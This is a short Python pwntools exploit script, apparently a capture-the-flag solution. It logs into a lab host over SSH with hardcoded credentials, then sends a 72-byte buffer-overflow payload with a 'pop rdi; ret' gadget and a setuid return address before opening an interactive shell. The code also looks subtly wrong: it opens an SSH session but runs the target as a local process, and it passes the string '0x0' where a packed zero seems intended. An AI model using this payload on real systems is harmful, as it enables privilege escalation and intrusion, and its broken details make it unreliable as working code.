#!/usr/bin/python3
# Author: Hack.You
from pwn import *
import warnings


io = ssh(user='magna', password='magnaisanelephant', host='10.10.152.48')
sh = process('/home/magna/hacktheworld')
context.log_level = 'info'
warnings.filterwarnings("ignore", category=BytesWarning, message="Text is not bytes; assuming ASCII, no guarantees.")

offset = 72
pop_rdi = p64(0x0000000000400773) # pop rdi; ret; 
setuid = p64(0x00000000004006c4)

payload = b'A'*offset + pop_rdi + b'0x0' + setuid

sh.sendline(payload)

sh.interactive()
